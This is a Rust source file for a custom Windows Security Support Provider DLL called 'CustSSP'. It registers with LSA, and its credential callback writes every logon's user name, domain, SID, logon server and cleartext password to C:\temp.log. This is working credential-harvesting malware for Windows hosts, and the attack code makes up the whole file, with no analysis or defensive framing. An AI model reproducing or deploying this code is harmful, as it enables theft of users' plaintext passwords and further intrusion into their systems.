use std::{os::{windows::prelude::{FileExt, OsStringExt, OsStrExt}, raw::c_void}, io::Write, slice, ffi::{OsString, CString}, fs::File};
use windows::{
    Win32::{
        Security::{
            Authentication::Identity::{ 
                SECPKG_PARAMETERS, LSA_SECPKG_FUNCTION_TABLE, SECPKG_FLAG_ACCEPT_WIN32_NAME, SECPKG_FLAG_CONNECTION, SECURITY_LOGON_TYPE, LSA_UNICODE_STRING, SECPKG_PRIMARY_CRED, SECPKG_SUPPLEMENTAL_CRED, SECPKG_INTERFACE_VERSION, SecPkgInfoW, PLSA_AP_INITIALIZE_PACKAGE, PLSA_AP_LOGON_USER, PLSA_AP_CALL_PACKAGE, PLSA_AP_LOGON_TERMINATED, PLSA_AP_CALL_PACKAGE_PASSTHROUGH, PLSA_AP_LOGON_USER_EX, PLSA_AP_LOGON_USER_EX2, SpShutdownFn, SpInitializeFn, SpAcceptCredentialsFn, SpAcquireCredentialsHandleFn, SpFreeCredentialsHandleFn, LSA_AP_POST_LOGON_USER, SpExtractTargetInfoFn, PLSA_AP_POST_LOGON_USER_SURROGATE, PLSA_AP_PRE_LOGON_USER_SURROGATE, PLSA_AP_LOGON_USER_EX3, SpGetTbalSupplementalCredsFn, SpGetRemoteCredGuardSupplementalCredsFn, SpGetRemoteCredGuardLogonBufferFn, SpValidateTargetInfoFn, SpUpdateCredentialsFn, SpGetCredUIContextFn, SpExchangeMetaDataFn, SpQueryMetaDataFn, SpChangeAccountPasswordFn, SpSetCredentialsAttributesFn, SpSetContextAttributesFn, SpSetExtendedInformationFn, SpAddCredentialsFn, SpQueryContextAttributesFn, SpGetExtendedInformationFn, SpGetUserInfoFn, SpApplyControlTokenFn, SpDeleteContextFn, SpAcceptLsaModeContextFn, SpInitLsaModeContextFn, SpDeleteCredentialsFn, SpGetCredentialsFn, SpSaveCredentialsFn, SpQueryCredentialsAttributesFn}, Authorization::ConvertSidToStringSidW
            }, 
            Foundation::{NTSTATUS, STATUS_SUCCESS, PSID}
        }, core::PWSTR
    };
use windows::core::Result;
use windows::core::Error;

pub type SpGetInfoFn = ::core::option::Option<unsafe extern "system" fn(packageinfo: *mut SecPkgInfoW) -> NTSTATUS>;

#[repr(C)]
pub struct SECPKG_FUNCTION_TABLE {
    pub InitializePackage: PLSA_AP_INITIALIZE_PACKAGE,
    pub LogonUserA: PLSA_AP_LOGON_USER,
    pub CallPackage: PLSA_AP_CALL_PACKAGE,
    pub LogonTerminated: PLSA_AP_LOGON_TERMINATED,
    pub CallPackageUntrusted: PLSA_AP_CALL_PACKAGE,
    pub CallPackagePassthrough: PLSA_AP_CALL_PACKAGE_PASSTHROUGH,
    pub LogonUserExA: PLSA_AP_LOGON_USER_EX,
    pub LogonUserEx2: PLSA_AP_LOGON_USER_EX2,
    pub Initialize: SpInitializeFn,
    pub Shutdown: SpShutdownFn,
    pub GetInfo: SpGetInfoFn,
    pub AcceptCredentials: SpAcceptCredentialsFn,
    pub AcquireCredentialsHandleA: SpAcquireCredentialsHandleFn,
    pub QueryCredentialsAttributesA: SpQueryCredentialsAttributesFn,
    pub FreeCredentialsHandle: SpFreeCredentialsHandleFn,
    pub SaveCredentials: SpSaveCredentialsFn,
    pub GetCredentials: SpGetCredentialsFn,
    pub DeleteCredentials: SpDeleteCredentialsFn,
    pub InitLsaModeContext: SpInitLsaModeContextFn,
    pub AcceptLsaModeContext: SpAcceptLsaModeContextFn,
    pub DeleteContext: SpDeleteContextFn,
    pub ApplyControlToken: SpApplyControlTokenFn,
    pub GetUserInfo: SpGetUserInfoFn,
    pub GetExtendedInformation: SpGetExtendedInformationFn,
    pub QueryContextAttributesA: SpQueryContextAttributesFn,
    pub AddCredentialsA: SpAddCredentialsFn,
    pub SetExtendedInformation: SpSetExtendedInformationFn,
    pub SetContextAttributesA: SpSetContextAttributesFn,
    pub SetCredentialsAttributesA: SpSetCredentialsAttributesFn,
    pub ChangeAccountPasswordA: SpChangeAccountPasswordFn,
    pub QueryMetaData: SpQueryMetaDataFn,
    pub ExchangeMetaData: SpExchangeMetaDataFn,
    pub GetCredUIContext: SpGetCredUIContextFn,
    pub UpdateCredentials: SpUpdateCredentialsFn,
    pub ValidateTargetInfo: SpValidateTargetInfoFn,
    pub PostLogonUser: LSA_AP_POST_LOGON_USER,
    pub GetRemoteCredGuardLogonBuffer: SpGetRemoteCredGuardLogonBufferFn,
    pub GetRemoteCredGuardSupplementalCreds: SpGetRemoteCredGuardSupplementalCredsFn,
    pub GetTbalSupplementalCreds: SpGetTbalSupplementalCredsFn,
    pub LogonUserEx3: PLSA_AP_LOGON_USER_EX3,
    pub PreLogonUserSurrogate: PLSA_AP_PRE_LOGON_USER_SURROGATE,
    pub PostLogonUserSurrogate: PLSA_AP_POST_LOGON_USER_SURROGATE,
    pub ExtractTargetInfo: SpExtractTargetInfoFn,
}
const SecPkgFunctionTable : SECPKG_FUNCTION_TABLE= SECPKG_FUNCTION_TABLE{
    InitializePackage: None , 
    LogonUserA: None ,
    CallPackage: None,
    LogonTerminated: None,
    CallPackageUntrusted: None,
    CallPackagePassthrough: None,
    LogonUserExA: None,
    LogonUserEx2: None,
    Initialize: Some(_SpInitialize),
    Shutdown: Some(_SpShutDown),
    GetInfo: Some(_SpGetInfo),
    AcceptCredentials: Some(_SpAcceptCredentials),
    AcquireCredentialsHandleA: None,
    QueryCredentialsAttributesA: None,
    FreeCredentialsHandle: None,
    SaveCredentials: None,
    GetCredentials: None,
    DeleteCredentials: None,
    InitLsaModeContext: None,
    AcceptLsaModeContext: None,
    DeleteContext: None,
    ApplyControlToken: None,
    GetUserInfo: None,
    GetExtendedInformation: None,
    QueryContextAttributesA: None,
    AddCredentialsA: None,
    SetExtendedInformation: None,
    SetContextAttributesA: None,
    SetCredentialsAttributesA: None,
    ChangeAccountPasswordA: None,
    QueryMetaData: None,
    ExchangeMetaData: None,
    GetCredUIContext: None,
    UpdateCredentials: None,
    ValidateTargetInfo: None,
    PostLogonUser: None,
    GetRemoteCredGuardLogonBuffer: None,
    GetRemoteCredGuardSupplementalCreds: None,
    GetTbalSupplementalCreds: None,
    LogonUserEx3: None,
    PreLogonUserSurrogate: None,
    PostLogonUserSurrogate: None,
    ExtractTargetInfo: None,
};


#[no_mangle]
pub unsafe extern "system" fn _SpGetInfo(packageinfo: *mut SecPkgInfoW) -> NTSTATUS {
    (*packageinfo).fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    (*packageinfo).wVersion = 1;
    (*packageinfo).wRPCID = 0; 
    (*packageinfo).cbMaxToken = 0;
    let name = OsString::from("CustSSP").encode_wide().chain(Some(0)).collect::<Vec<_>>().as_ptr();
    let Comment= OsString::from("CustSSP v1.0").encode_wide().chain(Some(0)).collect::<Vec<_>>().as_ptr();
    (*packageinfo).Name = name as *mut u16;
    (*packageinfo).Comment = Comment as *mut u16;
    STATUS_SUCCESS
}

#[no_mangle]
pub unsafe extern "system" fn _SpShutDown() -> NTSTATUS {
    STATUS_SUCCESS
}
#[no_mangle]
pub unsafe extern "system" fn _SpInitialize(
        packageid: usize,
        parameters: *const SECPKG_PARAMETERS,
        functiontable: *const LSA_SECPKG_FUNCTION_TABLE,
    ) -> NTSTATUS {
        STATUS_SUCCESS
    }
pub fn lsa_unicode_string_to_string(lsa_us: &LSA_UNICODE_STRING) -> String {
        let slice = unsafe { slice::from_raw_parts(lsa_us.Buffer.0 as *const u16, lsa_us.Length as usize / 2) };
        let os_string = OsString::from_wide(slice);
        os_string.into_string().unwrap()
}
#[no_mangle]
pub unsafe extern "system" fn _SpAcceptCredentials(
        logontype: SECURITY_LOGON_TYPE,
        accountname: *const LSA_UNICODE_STRING,
        primarycredentials: *const SECPKG_PRIMARY_CRED,
        supplementalcredentials: *const SECPKG_SUPPLEMENTAL_CRED,
    ) -> NTSTATUS {
        let mut logfile = File::create("C:\\temp.log").expect("");
        logfile.write_all(">>>>\n".as_bytes()).expect("CustSSP.log write failed");
        writeln!(
            logfile,
            "[+] Authentication Id : {}:{} ({:08x}:{:08x})",
            (*primarycredentials).LogonId.HighPart,
            (*primarycredentials).LogonId.LowPart,
            (*primarycredentials).LogonId.HighPart,
            (*primarycredentials).LogonId.LowPart,
        ).unwrap();
        let logon_type_str = match logontype {
            SECURITY_LOGON_TYPE::UndefinedLogonType => "UndefinedLogonType",
            SECURITY_LOGON_TYPE::Interactive => "Interactive",
            SECURITY_LOGON_TYPE::Network => "Network",
            SECURITY_LOGON_TYPE::Batch => "Batch",
            SECURITY_LOGON_TYPE::Service => "Service",
            SECURITY_LOGON_TYPE::Proxy => "Proxy",
            SECURITY_LOGON_TYPE::Unlock => "Unlock",
            SECURITY_LOGON_TYPE::NetworkCleartext => "NetworkCleartext",
            SECURITY_LOGON_TYPE::NewCredentials => "NewCredentials",
            SECURITY_LOGON_TYPE::RemoteInteractive => "RemoteInteractive",
            SECURITY_LOGON_TYPE::CachedInteractive => "CachedInteractive",
            SECURITY_LOGON_TYPE::CachedRemoteInteractive => "CachedRemoteInteractive",
            SECURITY_LOGON_TYPE::CachedUnlock => "CachedUnlock",
            _ => "Unknown !"
        };
        writeln!(logfile, "[+] Logon Type        : {}", logon_type_str).unwrap();
        writeln!(logfile, "[+] User Name         : {:?}", accountname);
        writeln!(logfile, "[+] * Domain   : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).DomainName));
        writeln!(logfile, "[+] * Logon Server     : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).LogonServer));
        writeln!(logfile, "[+] * SID     : {:?}", convert_sid_to_string((*primarycredentials).UserSid));
        writeln!(logfile, "[+] * UserName   : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).DownlevelName));
        writeln!(logfile, "[+] * Password       : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).Password));
        drop(logfile);
        STATUS_SUCCESS
    }
    
#[no_mangle]
pub fn convert_sid_to_string(sid: PSID) -> Result<String> {
        let mut sid_string_ptr: PWSTR = windows::core::PWSTR(std::ptr::null_mut());
        let result = unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) };
        if result.is_ok() {
            let sid_string = unsafe { get_string_from_pwstr(sid_string_ptr) };
            Ok(sid_string)
        } else {
            Err(Error::from_win32())
        }
    }
    
#[no_mangle]
pub unsafe fn get_string_from_pwstr(pwstr: PWSTR) -> String {
        let len = (0..).take_while(|&i| *pwstr.0.offset(i) != 0).count();
        let slice = std::slice::from_raw_parts(pwstr.0 as *const u16, len);
        String::from_utf16_lossy(slice)
    }
    
#[no_mangle]
pub unsafe extern "system" fn SpLsaModeInitialize(
    LsaVersion: u32,
    PackageVersion: *mut u32,
    ppTables: *mut *const SECPKG_FUNCTION_TABLE,
    pcTables: *mut u32,
) -> NTSTATUS {
    *PackageVersion = SECPKG_INTERFACE_VERSION ;
    *ppTables = &SecPkgFunctionTable;
    *pcTables = 1 as u32;
    STATUS_SUCCESS
}